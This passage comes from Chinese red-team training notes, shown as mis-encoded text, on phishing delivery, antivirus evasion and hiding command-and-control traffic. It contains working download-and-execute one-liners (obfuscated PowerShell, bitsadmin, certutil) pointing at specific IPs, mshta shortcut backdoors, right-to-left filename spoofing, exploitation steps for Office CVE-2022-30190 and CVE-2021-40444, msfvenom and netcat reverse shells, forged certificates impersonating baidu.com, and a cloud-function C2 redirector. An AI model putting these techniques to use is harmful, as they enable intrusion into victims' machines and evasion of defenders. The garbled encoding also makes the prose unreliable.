4ã€åˆ©ç”¨ç³»ç»Ÿè‡ªå¸¦çš„ç™½åå• mshta.exe è¿œç¨‹ç¨‹åºè°ƒç”¨åé—¨ï¼Œæˆ‘è¿˜æ˜¯æ²¡ç”¨ cs æ„é€ çš„åœ°å€ï¼Œæˆ‘ç”¨ python å¯åŠ¨çš„ web æœåŠ¡

```
C:\Windows\System32\mshta.exe http://192.168.0.103:1222/1.hta
```

æŠŠå¿«æ·æ–¹å¼çš„ç›®æ ‡æ”¹ä¸ºä»¥ä¸Šå‘½ä»¤ï¼Œç„¶åå±æ€§**æ›´æ”¹å›¾æ ‡**ä¼ªè£…ï¼Œæˆ–è€…ç”¨ `Restorator 2018` æ›´æ”¹å›¾æ ‡

<img src=".\å›¾ç‰‡\Snipaste_2023-01-02_20-50-44.png" alt="Snipaste_2023-01-02_20-50-44" style="zoom:80%;" />

è¿è¡Œä¸Šçº¿

<img src=".\å›¾ç‰‡\Snipaste_2023-01-02_21-00-14.png" alt="Snipaste_2023-01-02_21-00-14" style="zoom: 67%;" />

**æ³¨æ„**ï¼šè¿ç”¨ `C:\Windows\System32\mshta.exe` æ˜¯å†…å­˜æ‰§è¡Œï¼Œæœ¬èº«å°±æ˜¯å…æ€ï¼Œä½†æ˜¯**é‡åˆ°æ€æ¯’è½¯ä»¶æ˜¯å…ˆæŠ¥æ¯’å´ä¾ç„¶æ‰§è¡Œä¸Šçº¿äº†**

### ä»¥ä¸Šç®€å•å…æ€æ€è·¯

chmç”µå­ä¹¦å…æ€ 

æ ¸å¿ƒæ˜¯ä¸‹è½½æ–‡ä»¶ï¼Œæ‰§è¡Œæ–‡ä»¶ï¼Œä¸Šçº¿

ä¸€èˆ¬æ‹¦æˆªï¼š**è°ƒç”¨** **æ–‡ä»¶**  ï¼ˆä¸¤ä¸ªæ–¹é¢ï¼‰

1ã€ä¸‹è½½çš„åé—¨æ–‡ä»¶å–ä»£ï¼ˆæˆ‘ä»¬åˆ¶ä½œå…æ€çš„åé—¨ï¼Œ**ç»•è¿‡æ–‡ä»¶æ‹¦æˆª**ï¼‰

2ã€æ··æ·†æ›¿æ¢ powershell bitsadmin certutilï¼ˆ**ç»•è¿‡ä¸‹è½½æ‹¦æˆª**ï¼‰

```
1ã€åˆ©ç”¨powershell
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://47.94.236.117:84/a'))"

2ã€åˆ©ç”¨bitsadmin
bitsadmin /transfer 604c http://47.94.236.117:83/a %APPDATA%\604c.exe&%APPDATA%\604c.exe&del %APPDATA%\604c.exe

"c""e""r""t""u""t""i""l" -"u""r""l""c""a""c""h""e" -split -f http://47.94.236.117/5.exe c:/5.exe & c:/5.exe

powershell -NoExit "$c1='IEX(New-Object Net.WebClient).Downlo';$c2='123(''http://47.94.236.117:84/a'')'.Replace('123','adString');IEX ($c1+$c2)"

copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe bypass.exe
.\bypass.exe "$a='IEX((New-Object Net.WebClient).DownloadString(''ht';$b='tp://xxx/hr.ps1''));';IEX ($a+$b)" 
```

## åé—¨çŒ¥çæ“ä½œä¸Officeçš„CVE

### åé—¨åç¼€åæ“ä½œ

`.exe` åç¼€å¾ˆæ•æ„Ÿ ï¼Œæˆ‘ä»¬æ¥æ“ä½œä¸€ä¸‹ exe åç¼€ï¼Œæ­¤è¿‡ç¨‹æ˜¯æ··æ·†çœ¼ç›ï¼Œä¸æ”¹å˜å®è´¨ `exe` åç¼€

ç”Ÿæˆä¸€ä¸ªåé—¨ `x.exe` ï¼Œé‡å‘½åé¼ æ ‡è½åœ¨ x ä¸ pgj ä¸­é—´ ï¼Œå€’åºæ˜¾ç¤ºæ–‡ä»¶å, ç‚¹å‡» `RLO`

<img src=".\å›¾ç‰‡\Snipaste_2023-01-02_21-32-01.png" alt="Snipaste_2023-01-02_21-32-01" style="zoom:80%;" />

å€’åºæ˜¾ç¤ºä¸º  `xexe.jpg` ï¼Œä»ç„¶å¯ä»¥ä¸Šçº¿

<img src=".\å›¾ç‰‡\Snipaste_2023-01-02_21-38-40.png" alt="Snipaste_2023-01-02_21-38-40"  />

<img src=".\å›¾ç‰‡\Snipaste_2023-01-02_21-42-23.png" alt="Snipaste_2023-01-02_21-42-23" style="zoom:80%;" />

### å‹ç¼©æ–‡ä»¶

ç”¨ WinRAR æ†ç»‘æ–‡ä»¶

ä¸ä»¥ä¸Š flash é’“é±¼å®éªŒæ—¶çš„æ“ä½œç±»ä¼¼ï¼Œå‚è€ƒå³å¯ã€‚**åé—¨ä¸æ­£å¸¸ç¨‹åºä¸€èµ·å‹ç¼©**ï¼Œ**è§£å‹ä¹‹åå°±è‡ªåŠ¨è¿è¡Œäº†åé—¨æ–‡ä»¶**ï¼Œå¯é…åˆæ–‡ä»¶åç¼€åå€’åºä¸€èµ·æ“ä½œï¼Œä¹Ÿå¯ä»¥ç”¨  ç™½æ–‡ä»¶+å…æ€åé—¨ ä¸€èµ·å‹ç¼©

### æ†ç»‘æ–‡ä»¶

[F:\xiaodi\014-çº¢é˜Ÿ-å°è¿ªå®‰å…¨\154-çº¢é˜Ÿé’“é±¼-æ†ç»‘å™¨&èµ„æºæå–&Office-CVEé¡¹ç›®ç­‰\æ–‡ä»¶æ†ç»‘å™¨.exe]()

<img src=".\å›¾ç‰‡\Snipaste_2023-01-02_22-03-22.png" alt="Snipaste_2023-01-02_22-03-22" style="zoom:80%;" />

ç™½æ–‡ä»¶+å…æ€åé—¨   ä¸Šçº¿

<img src=".\å›¾ç‰‡\Snipaste_2023-01-02_22-11-42.png" alt="Snipaste_2023-01-02_22-11-42" style="zoom: 67%;" />

**æ³¨æ„**ï¼šæ­¤ç±»**æ†ç»‘æ–‡ä»¶çš„è¡Œä¸º**å¯èƒ½è¢«ä¸€äº›æ€æ¯’è½¯ä»¶è®¤ä¸ºæ˜¯å±é™©çš„ï¼Œæ‰€ä»¥å¯èƒ½æŠ¥æ¯’ä¸º**æœ¨é©¬é‡Šæ”¾å™¨**ï¼Œå³ä½¿å…¨æ˜¯å…æ€æœ¨é©¬å’Œç™½æ–‡ä»¶æ†ç»‘çš„ä¹Ÿä¸è¡Œ

æ†ç»‘ä¹Ÿä¸æ˜¯ä¸‡èƒ½çš„ï¼Œç™½æ–‡ä»¶ + ä¸å…æ€æœ¨é©¬ æ†ç»‘ä¹Ÿä¼šè¢«æ€æ‰

### Officeå¥—ä»¶CVE

#### CVE-2022-30190

-Microsoft MSDT CVE-2022-30190 ä»£ç æ‰§è¡Œ

https://github.com/JohnHammond/msdt-follina

è¯¥æ¼æ´é¦–æ¬¡å‘ç°åœ¨2022å¹´5æœˆ27æ—¥ï¼Œç”±ç™½ä¿„ç½—æ–¯çš„ä¸€ä¸ªIPåœ°å€ä¸Šä¼ ã€‚æ¶æ„æ–‡æ¡£ä»Wordè¿œç¨‹æ¨¡æ¿åŠŸèƒ½ä»è¿œç¨‹WebæœåŠ¡å™¨æ£€ç´¢HTMLæ–‡ä»¶ï¼Œ

é€šè¿‡ms-msdt MSProtocol URIæ–¹æ³•æ¥æ‰§è¡Œæ¶æ„PowerShellä»£ç ã€‚æ„ŸæŸ“è¿‡ç¨‹åˆ©ç”¨ç¨‹åºmsdt.exeï¼Œè¯¥ç¨‹åºç”¨äºè¿è¡Œå„ç§ç–‘éš¾è§£ç­”ç¨‹åºåŒ…ã€‚

æ­¤å·¥å…·çš„æ¶æ„æ–‡æ¡£æ— éœ€ç”¨æˆ·äº¤äº’å³å¯è°ƒç”¨å®ƒã€‚å¯¼è‡´åœ¨å®è¢«ç¦ç”¨çš„æƒ…å†µä¸‹ï¼Œæ¶æ„æ–‡æ¡£ä¾æ—§å¯ä»¥ä½¿ç”¨ms-msdt URIæ‰§è¡Œä»»æ„PowerShellä»£ç ã€‚

ç›®å‰å·²çŸ¥å½±å“çš„ç‰ˆæœ¬ä¸ºï¼š

office 2021 Ltsã€office 2019ã€office 2016ã€Office 2013ã€Office ProPlusã€Office 365

##### æµ‹è¯•ï¼š

```
msdt.exe /id PCWDiagnostic /skip force /param "IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'Unicode.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'YwBhAGwAYwA='+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe"
```

<img src=".\å›¾ç‰‡\Snipaste_2023-01-05_11-22-55.png" alt="Snipaste_2023-01-05_11-22-55" style="zoom: 50%;" />

å¼¹å‡ºè®¡ç®—å™¨ä¾¿å¯èƒ½å­˜åœ¨æ¼æ´

##### å¤ç°

###### 1ã€ç”Ÿæˆåé—¨ä¸Šä¼ 

cs ç”Ÿæˆäº†åé—¨

###### 2ã€æ„é€ ä¸‹è½½åœ°å€

ç”¨ python æ„é€ äº†ä¸€ä¸ªä¸‹è½½åœ°å€

```
python3 -m http.server 8085
```

###### 3ã€ä¿®æ”¹ä»£ç ä¸‹è½½

ä½œè€…æ˜¯ä¸‹è½½ nc.exe æ¥æ‰§è¡Œçš„ï¼Œæˆ‘ä»¬å¯ä»¥æ¢æˆ cs åé—¨çš„ä¸‹è½½åœ°å€

```
if args.reverse:
        command = f"""Invoke-WebRequest https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""
```

```
   if args.reverse:
        command = f"""Invoke-WebRequest http://192.168.10.6:8085/1111.exe -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""
```

###### 4ã€ç”Ÿæˆæ¶æ„æ–‡æ¡£

```
python follina.py -i 192.168.10.5 -p 4444 -r 9999
```

-i æ˜¯ç›®æ ‡æœ¬åœ°åœ°å€ åé¢ç«¯å£æ— æ‰€è°“ï¼Œæˆ‘ä»¬æ²¡ç”¨ nc ï¼Œæˆ‘ä»¬ä¸‹è½½çš„æ˜¯ cs åé—¨ï¼Œåªéœ€æ»¡è¶³åŸä»£ç çš„å‚æ•°å³å¯

<img src=".\å›¾ç‰‡\Snipaste_2023-01-05_12-22-22.png" alt="Snipaste_2023-01-05_12-22-22" style="zoom:60%;" />

5ã€ç‚¹å‡»æ–‡æ¡£ä¸Šçº¿

<img src=".\å›¾ç‰‡\Snipaste_2023-01-05_12-23-08.png" alt="Snipaste_2023-01-05_12-23-08" style="zoom:60%;" />

#### CVE-2021-40444

https://github.com/lockedbyte/CVE-2021-40444

å½±å“ï¼šWindows 7/8/8.1/10,Windows Server 2008/2008R2/2012/2012R2/2016/2019/2022 ç­‰å„ä¸ªä¸»æµç‰ˆæœ¬

è¿™ä¸ªæ˜¯é’ˆå¯¹ **windows æ“ä½œç³»ç»Ÿ**çš„

##### æ­¥éª¤

###### 1ã€å®‰è£…ä¾èµ–

```
apt-get install lcab
```

###### 2ã€ç”Ÿæˆ DLL

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.178.10.6 lport=9999 -f dll > shell.dll
```

###### 3ã€ç›‘å¬ä¸Šçº¿

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 9999
run
```

###### 4ã€ç”Ÿæˆæ–‡æ¡£

```
cp shell.dll CVE-2021-40444-master  
cd CVE-2021-40444-master
python3 exploit.py generate shell.dll http://192.168.10.6:10000
```

```
â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/CVE-2021-40444-master/out]
â””â”€# ls
0-blank  document.docx
```

###### 5ã€ç›‘å¬æ–‡æ¡£

```
python3 exploit.py host 10000
```

###### 6ã€å–å‡ºæ–‡æ¡£æ‰§è¡Œä¾¿ä¸Šçº¿

**æ³¨æ„**ï¼šæ€æ¯’èƒ½æ€æ‰ï¼Œæ€çš„æ˜¯æ¼æ´ï¼Œä¸å¥½å…æ€

# æµé‡æ–¹é¢

**èƒŒæ™¯äº¤ä»£**

åœ¨çº¢è“å¯¹æŠ—æˆ–æ—¥å¸¸æµ‹è¯•ä¸­ä¼šå‡ºç°ä¸€ç§æƒ…å†µï¼Œå½“æˆ‘ä»¬ç»ˆäºè®©ç›®æ ‡æœºå™¨ä¸Šçº¿åï¼Œå´å› ä¸ºæ˜æ˜¾çš„é€šä¿¡ç‰¹å¾è¢«å®‰å…¨è®¾å¤‡æ£€æµ‹åˆ°ä»è€Œå¤±å»ç›®æ ‡æœºå™¨çš„æ§åˆ¶æƒé™ï¼Œè¿™æ—¶å°±éœ€è¦å¯¹ Cobalt Strike æˆ– MSF çš„**ç‰¹å¾è¿›è¡Œéšè—**ã€å¯¹å…¶é€šä¿¡**æµé‡è¿›è¡Œæ··æ·†**

**å¸¸è§çº¢è“å¯¹æŠ—ä¸­çº¢é˜Ÿé¢ä¸´é—®é¢˜**

```
1ã€é€šè®¯åè®®èµ°TCP&UDPåè®®ï¼Œç›´æ¥è¢«é˜²ç«å¢™é™åˆ¶å‡ºç½‘
2ã€é€šè®¯åè®®èµ°æ— åŠ å¯†HTTPåè®®ï¼Œç›´æ¥æ˜æ–‡ä¼ è¾“æˆæŒ‡çº¹ç‰¹å¾
3ã€é€šè®¯åè®®èµ°HTTPSæˆ–DNSåŠ å¯†åè®®ï¼Œç›´æ¥å·¥å…·è¯ä¹¦æˆæŒ‡çº¹ç‰¹å¾
4ã€é€šè®¯åè®®èµ°HTTPSæˆ–DNSåŠ å¯†åè®®ï¼Œç‰¹å¾æŒ‡çº¹ç­‰ä¿®æ”¹ååˆè¢«æœ”æºæ‹‰é»‘
```

çº¢é˜Ÿè¿›è¡Œæƒé™æ§åˆ¶ï¼Œä¸»æœºå¼€å§‹é™åˆ¶å‡ºç½‘ï¼Œå°è¯•èµ°å¸¸è§å‡ºç½‘åè®® http/https ,ç»“æœæµé‡è®¾å¤‡å…¥ä¾µæ£€æµ‹æ£€æµ‹ç³»ç»Ÿå‘ç°å¼‚å¸¸ï¼Œå°è¯•ä¿®æ”¹å·¥å…·æŒ‡çº¹ç‰¹å¾åŠ å¯†æµé‡é˜²æ­¢æ£€æµ‹ï¼Œç»“æœè¢«å®šä½åˆ°æ§åˆ¶æœåŠ¡å™¨ï¼Œå†æ¬¡ä½¿ç”¨ CDN ï¼Œäº‘å‡½æ•°ï¼Œç¬¬ä¸‰æ–¹ä¸Šçº¿ç­‰è¿›è¡Œéšè—ä¿è¯æƒé™ç»´æŒ

**è“é˜Ÿå‘ç°å¤„ç½®æƒ…å†µ**

```
1.è“é˜Ÿ-æœ”æºåæ‹‰é»‘æ§åˆ¶IP
2.è“é˜Ÿ-è®¾å¤‡å¹³å°æŒ‡çº¹å‘Šè­¦
3.è“é˜Ÿ-æµé‡åˆ†æå¼‚å¸¸å‘Šè­¦
```

## NC-æµé‡æŠ“åŒ…

### æœªåŠ å¯†

```
nc -lvvp 5577    # Ubuntu 192.168.10.10
nc -e /bin/bash 192.168.10.10 5577   # kali 192.168.10.8
```

æˆ‘ä»¬åœ¨ kali ä¸Šä½¿ç”¨ wireshark æŠ“åŒ…èƒ½å‘ç°ä¼ è¾“çš„**æ˜æ–‡æ•°æ®**ï¼Œè¿™ä¸ªå°±å¾ˆå®¹æ˜“è¢«å‘ç°

wireshark è¿‡æ»¤  https://pcedu.pconline.com.cn/1530/15300544.html

```
tcp.port==5577   # wireshark è¿‡æ»¤
```

<img src=".\å›¾ç‰‡\Snipaste_2023-01-06_10-48-28.png" alt="Snipaste_2023-01-06_10-48-28" style="zoom:60%;" />

### åŠ å¯†å

åœ¨æˆ‘ä»¬çš„æ”»å‡»ç«¯ç”Ÿæˆè‡ªç­¾åè¯ä¹¦ ï¼Œæ­¤æ—¶ç”¨çš„æ˜¯ Ubuntu

```
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
```

åœ¨æ”»å‡»æœºä¸Šç›‘å¬æŒ‡å®šç«¯å£ï¼Œè¿™é‡Œæˆ‘é€‰æ‹© 5577

```
openssl s_server -quiet -key key.pem -cert cert.pem -port 5577
```

åœ¨å—å®³æœºä¸Šæ‰§è¡Œshellåå¼¹å‘½ä»¤ (æ³¨æ„ä¿®æ”¹ipå’Œç«¯å£) ï¼Œä½¿ç”¨çš„æ˜¯ kali

```
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.10.10:5577 > /tmp/s;
```

åå¼¹ shell æˆåŠŸ

<img src=".\å›¾ç‰‡\Snipaste_2023-01-06_10-55-34.png" alt="Snipaste_2023-01-06_10-55-34" style="zoom:60%;" />

å†æ¥åˆ°ç›®æ ‡æœº kali ä¸ŠæŠ“åŒ…çœ‹çœ‹ï¼Œå‘ç°æ•°æ®å˜æˆäº†**å¯†æ–‡**

<img src=".\å›¾ç‰‡\Snipaste_2023-01-06_10-57-46.png" alt="Snipaste_2023-01-06_10-57-46" style="zoom:60%;" />

## MSF-æµé‡ç‰¹å¾ä¿®æ”¹

msf ç”Ÿæˆçš„ https åé—¨**çš„ç¡®æ˜¯åŠ å¯†**çš„ï¼Œç„¶è€Œä»ç„¶æœ‰ä¸€äº›**æŒ‡çº¹ç‰¹å¾**ï¼Œæ¯”å¦‚è¯·æ±‚å¤´çš„ UA å•¥çš„ç­‰ç­‰ï¼Œæˆ‘ä»¬ä»ç„¶éœ€è¦è‡ªå·±ç”Ÿæˆè¯ä¹¦æ¥èº²é¿æ£€æµ‹

### msf -http åé—¨æµé‡

http æ˜¯æ˜æ–‡ä¼ è¾“ï¼Œå¾ˆå®¹æ˜“è¢«å‘ç°ã€‚å…ˆç”Ÿæˆåé—¨

```
msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.10.8 LPORT=5577 -f exe -o http.exe
```

å†ç›‘å¬

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set lhost 0.0.0.0
set lport 5577
run
```

kali æŠ“åŒ…çœ‹çœ‹ï¼Œä»¥ä¸‹éƒ½æ˜¯**å¤´éƒ¨ç‰¹å¾**ï¼Œç‰¹å¾è¢«è®¾å¤‡æ•è·åˆ°ï¼Œå¯ä»¥åˆ¤æ–­ä¸º msf åé—¨

<img src=".\å›¾ç‰‡\Snipaste_2023-01-06_11-20-24.png" alt="Snipaste_2023-01-06_11-20-24" style="zoom:60%;" />

### msf -https åé—¨æµé‡

å½“æˆ‘ä»¬è®¿é—®ä¸€ä¸ª https ç½‘ç«™æ—¶ï¼Œå¯ä»¥çœ‹åˆ°ç›¸å…³è¯ä¹¦ï¼Œæ¯”å¦‚ https://www.baidu.com

<img src=".\å›¾ç‰‡\Snipaste_2023-01-06_11-27-13.png" alt="Snipaste_2023-01-06_11-27-13" style="zoom:60%;" />

å½“æˆ‘ä»¬ä¸ä¿®æ”¹ msf çš„è¯ä¹¦æ—¶ï¼Œå®ƒä½¿ç”¨çš„æ˜¯è‡ªå¸¦çš„è¯ä¹¦ï¼Œå¾ˆå®¹æ˜“è¢«è¯†åˆ«åˆ°ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨ openssl æ¥ä¿®æ”¹è¯ä¹¦

#### æœªä¿®æ”¹httpsè¯ä¹¦

æ¥ä¸‹æ¥æˆ‘ä»¬ç”Ÿæˆ msf-https çš„åé—¨æ¥åˆ†æ

```
msfvenom -p windows/meterpreter/reverse_https LHOST=43.142.255.132 LPORT=5577 -f exe -o https.exe
```

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 5577
run
```

å‘ç°æœªä¿®æ”¹çš„è¯ä¹¦

#### å·²ä¿®æ”¹httpsè¯ä¹¦

1.æ”»å‡»æœºåˆ©ç”¨ openssl ç”Ÿæˆè¯ä¹¦

```
openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj "/C=UK/ST=xiaodi/L=xiaodi/O=Development/CN=www.baidu.com" -keyout www.baidu.com.key -out www.baidu.com.crt && cat www.baidu.com.key www.baidu.com.crt > www.baidu.com.pem && rm -f www.baidu.com.key www.baidu.com.crt
```

2. MSF ç”Ÿæˆç»‘å®šè¯ä¹¦åé—¨

```
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.10.8 LPORT=5577 PayloadUUIDTracking=true PayloadUUIDName=Whoamishell HandlerSSLCert=/root/www.baidu.com.pem StagerVerifySSLCert=true -f exe -o https-b.exe
```

3. MSF ç›‘å¬ä¸Šçº¿

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 5577
set HandlerSSLCert /root/www.baidu.com.pem
set StagerVerifySSLCert true
run
```

ä¸Šçº¿åå‘ç°è¯ä¹¦å˜æˆäº† baidu.comï¼Œæ­¤å¤–ï¼Œwireshark æŠ“åŒ…æ—¶å‘ç°ä¹Ÿæ˜¯**åŠ å¯†çš„æ•°æ®**

<img src=".\å›¾ç‰‡\Snipaste_2023-01-06_11-54-02.png" alt="Snipaste_2023-01-06_11-54-02" style="zoom:60%;" />

#### impersonate_ssl æ¨¡å—

æ­¤å¤– Metasploit æ¡†æ¶è¿˜æœ‰ä¸€ä¸ªauxiliary/gather/impersonate_ssl æ¨¡å—ï¼Œå¯ä»¥ç”¨æ¥è‡ªåŠ¨ä»ä¿¡ä»»æºåˆ›å»ºä¸€ä¸ªè™šå‡è¯ä¹¦ï¼Œååˆ†æ–¹ä¾¿

```
use auxiliary/gather/impersonate_ssl 
set RHOST www.baidu.com
run
```

## CS-æµé‡

è§£å†³ HTTP/S é€šè®¯è¯ä¹¦åŠæµé‡ç‰¹å¾è¢«ç‰¹å¾æ ‡ç¤ºé—®é¢˜

JDK Keytool ä¿®æ”¹ CS ç‰¹å¾

### æ­¥éª¤

#### 1.ä¿®æ”¹é»˜è®¤ç«¯å£

ç¼–è¾‘ teamserver æ–‡ä»¶ï¼Œæ›´æ”¹server portéƒ¨åˆ† 54321

#### 2.å»é™¤storeè¯ä¹¦ç‰¹å¾

1ã€æŸ¥çœ‹è¯ä¹¦æŒ‡çº¹ï¼Œcobaltstrike.store ä¸ºé»˜è®¤è¯ä¹¦ï¼Œå£ä»¤ä¸º 123456 ï¼Œå¯åœ¨ teamserver é‡ŒæŸ¥çœ‹

```
keytool -list -v -keystore cobaltstrike.store
```

<img src=".\å›¾ç‰‡\Snipaste_2023-01-06_12-09-29.png" alt="Snipaste_2023-01-06_12-09-29" style="zoom:60%;" />

è¿™ä¸ªç‰¹å¾å¾ˆæ˜æ˜¾å§

2ã€ç”Ÿæˆè¯ä¹¦æŒ‡çº¹

```
keytool -keystore cobaltstrike_fake_3.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias baidu.com -dname "CN=baidu e-Szigno Root CA, OU=e-Szigno CA, O=baidu Ltd., L=Budapest, S=HU, C=HU,ST=FL"
```

æŸ¥çœ‹æ–°ç”Ÿæˆçš„ cobaltstrike_fake.store

```
keytool -list -v -keystore cobaltstrike_fake.store
```

<img src=".\å›¾ç‰‡\Snipaste_2023-01-06_12-16-11.png" alt="Snipaste_2023-01-06_12-16-11" style="zoom:60%;" />

3ã€åº”ç”¨è¯ä¹¦æŒ‡çº¹

```
keytool -importkeystore -srckeystore cobaltstrike_fake.store -destkeystore cobaltstrike_fake.store -deststoretype pkcs12
```

#### 3.å»é™¤æµé‡é€šè®¯ç‰¹å¾

è§„åˆ™èµ„æºï¼š

https://github.com/xx0hcd/Malleable-C2-Profiles

https://github.com/FortyNorthSecurity/C2concealer

1.åˆ›å»ºC2æ–‡ä»¶ï¼šXXXX.Profiles

2.å†™å…¥é€šè®¯è§„åˆ™: UAå¤´&GET&POST&å¿ƒè·³&è¯ä¹¦ç­‰

3.æµ‹è¯•è§„åˆ™æ­£å¸¸ï¼š./c2lint XXXX.profile

4.åŠ è½½C2è§„åˆ™å¯åŠ¨ï¼š./teamserver ip å¯†ç  XXXX.Profile

**æ³¨æ„**ï¼šåœ¨ XXXX.Profile é‡Œä¿®æ”¹ store æ–‡ä»¶ï¼ŒåŠ å…¥ä»¥ä¸‹å†…å®¹ï¼Œè¦ä¸ä¹‹å‰ç”Ÿæˆçš„ store æ–‡ä»¶å†…å®¹ä¸€è‡´

```
https-certificate {
  set CN      "baidu";
  set O        "baidu Ltd.";
  set C        "HU";
  set L        "Budapest";
  set OU      "e-Szigno CA";
  set ST      "FL";
  set validity "120";
}
#è®¾ç½®ï¼Œä¿®æ”¹æˆä½ çš„è¯ä¹¦åç§°å’Œè¯ä¹¦å¯†ç 
code-signer{
  set keystore "cobaltstrike_fake_3.store";
  set password "123456";
  set alias "baidu.com";
}
```

ç„¶åæˆ‘ä»¬ä½¿ç”¨ wireshark æŠ“åŒ…ï¼Œçœ‹åˆ°äº†æŠ“åˆ°çš„æµé‡å’Œ XXXX.Profile é‡Œä¸€æ ·ï¼Œè¿™ä¸ªæ˜¯ http çš„beaconï¼Œhttps beacon çš„ **æµé‡å’Œè¯ä¹¦** ä¹Ÿå·²ç»æ¢äº†ï¼Œç„¶è€Œï¼Œè“é˜Ÿä»ç„¶èƒ½**å‘ç° teamserver çš„ ip åœ°å€**

<img src=".\å›¾ç‰‡\Snipaste_2023-01-07_14-47-24.png" alt="Snipaste_2023-01-07_14-47-24" style="zoom:60%;" />

### ä½¿ç”¨ CDN

æ€»æ‰€å‘¨çŸ¥ï¼Œ CND å¯ä»¥æŒ‡å®šåŸŸåæŒ‡å‘å¤šä¸ª ip ï¼Œè¿™æ—¶å€™è“é˜Ÿçœ‹åˆ°çš„å°±æ˜¯æˆ‘ä»¬ä½¿ç”¨ CDN åŠ é€Ÿåçš„å…¶å®ƒ ip äº†ï¼Œè“é˜Ÿå¯ä»¥æŠŠteamserverå¯ç”¨ ip ç»™å…¨å°äº†ï¼Œä¹Ÿå¯ä»¥ç›´æ¥å°åŸŸå

ä½¿ç”¨å‚è€ƒ

[F:\xiaodi\014-çº¢é˜Ÿ-å°è¿ªå®‰å…¨\155-çº¢é˜Ÿ-æµé‡åŠ å¯†éšè—&CDNé…ç½®&C2é¡¹ç›®ç­‰\Aliyun-CS-C2&CDNé…ç½®-å°è¿ªå®‰å…¨.docx]()

é…ç½®ï¼šhttps://mp.weixin.qq.com/s/MghFgegdp3l3tFE3hOvcYw

### åæœ”æºéšè—

C2 é¡¹ç›® & CDN åŸŸå‰ç½® & äº‘å‡½æ•° & æ•°æ®ä¸­è½¬ & DNS è½¬å‘

```
#åŸŸå‰ç½®-CDNé…åˆ
å¤§éƒ¨åˆ†IDCä¸å†æ”¯æŒ

#DNSåè®®-åŸŸåè®°å½•è§£æ
1ã€åŸŸåè§£æè®¾ç½®A,NSè®°å½•
ns1 ns cs.xxx.com
ns2 ns cs.xxx.com
cs  A  xx.xx.xx.xx(CSçš„IP)
2ã€CSç›‘å¬å™¨-DNS
Beacon DNS
DNSåœ°å€é…ç½®ï¼š
ns1.xxx.com
ns2.xxx.com
3ã€æ‰§è¡Œåcheckinå”¤é†’

#äº‘å‡½æ•°-è…¾è®¯äº‘æ“ä½œ
1ã€åˆ›å»ºäº‘å‡½æ•°
è…¾è®¯äº‘-äº‘äº§å“-äº‘å‡½æ•°-å‡½æ•°æœåŠ¡-æ–°å»º
2ã€åˆ›å»ºå‡½æ•°æœåŠ¡
é€‰æ‹©ä»å¤´å¼€å§‹-å‡½æ•°ç±»å‹é€‰æ‹©äº‹ä»¶å‡½æ•°-å‡½æ•°åç§°ä»»æ„-
è¿è¡Œç¯å¢ƒé€‰æ‹©python3.6-å¹¶å¤åˆ¶å¦‚ä¸‹ä»£ç å¹¶ä¿®æ”¹CSçš„IP-ç‚¹å‡»å®Œæˆ
# -*- coding: utf8 -*-
import json,requests,base64
def main_handler(event, context):
    C2='https://XXXX'  # ä¿®æ”¹ä¸ºè‡ªå·±C2æœåŠ¡å™¨åœ°å€
    path=event['path']
    headers=event['headers']
    print(event)
    if event['httpMethod'] == 'GET' :
        resp=requests.get(C2+path,headers=headers,verify=False) 
    else:
        resp=requests.post(C2+path,data=event['body'],headers=headers,verify=False)
        print(resp.headers)
        print(resp.content)

    response={
        "isBase64Encoded": True,
        "statusCode": resp.status_code,
        "headers": dict(resp.headers),
        "body": str(base64.b64encode(resp.content))[2:-1]
    }
    return response
3ã€åˆ›å»ºè§¦å‘å™¨
è§¦å‘æ–¹å¼é€‰æ‹©APIç½‘å…³è§¦å‘-å‹¾é€‰å¯ç”¨é›†æˆå“åº”-ç‚¹å‡»æäº¤
4ã€é…ç½®è§¦å‘å™¨
ç‚¹å‡»APIæœåŠ¡åå¯¹è§¦å‘å™¨è¿›è¡Œé…ç½®
å°†è·¯å¾„ä¿®æ”¹ä¸º/ï¼Œç„¶åç‚¹å‡»ç«‹å³å®Œæˆ
5ã€é…ç½®profileæ–‡ä»¶-è§¦å‘URL
set sample_name "t";
set sleeptime "3000";
set jitter    "0";
set maxdns    "255";
set useragent "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)";

http-get {

    set uri "/api/x";

    client {
        header "Accept" "*/*";
        metadata {
            base64;
            prepend "SESSIONID=";
            header "Cookie";
        }
    }

    server {
        header "Content-Type" "application/ocsp-response";
        header "content-transfer-encoding" "binary";
        header "Server" "Nodejs";
        output {
            base64;
            print;
        }
    }
}
http-stager {  
    set uri_x86 "/vue.min.js";
    set uri_x64 "/bootstrap-2.min.js";
}
http-post {
    set uri "/api/y";
    client {
        header "Accept" "*/*";
        id {
            base64;
            prepend "JSESSION=";
            header "Cookie";
        }
        output {
            base64;
            print;
        }
    }

    server {
        header "Content-Type" "application/ocsp-response";
        header "content-transfer-encoding" "binary";
        header "Connection" "keep-alive";
        output {
            base64;
            print;
